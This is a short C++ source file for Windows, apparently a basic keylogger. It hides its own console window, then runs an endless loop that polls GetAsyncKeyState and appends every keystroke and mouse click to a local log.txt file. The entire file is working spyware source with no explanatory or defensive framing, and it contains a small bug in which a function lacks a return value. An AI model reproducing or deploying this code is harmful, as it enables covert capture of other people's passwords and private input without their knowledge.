#include <cstring>
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text) {
	ofstream logfile;
	logfile.open("log.txt", fstream::app);
	logfile << text;
	logfile.close();
}

void hide(void) {
	HWND stealth;

	stealth = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
bool KeyIsListed(int iKey) {
	switch (iKey) {
	case VK_SPACE:
		WriteToLog(" ");
		break;
	case VK_RETURN:
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		WriteToLog(" *SHIFT* ");
		break;
	case VK_BACK:
		WriteToLog("\b");
		break;
	case VK_RBUTTON:
		WriteToLog("*rclick*");
		break;
	case VK_LBUTTON:
		WriteToLog("*lclick*");
		break;
	default:
		return false;
	}
}
int main(int argc, char* argv[]) {
	hide();
	char key;
	while (1) {
		Sleep(10);
		for (key = 8; key < 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE) {
					ofstream logfile;
					logfile.open("log.txt", fstream::app);
					logfile << key;
					logfile.close();
				}
			}
		}
	}
	return 0;
}
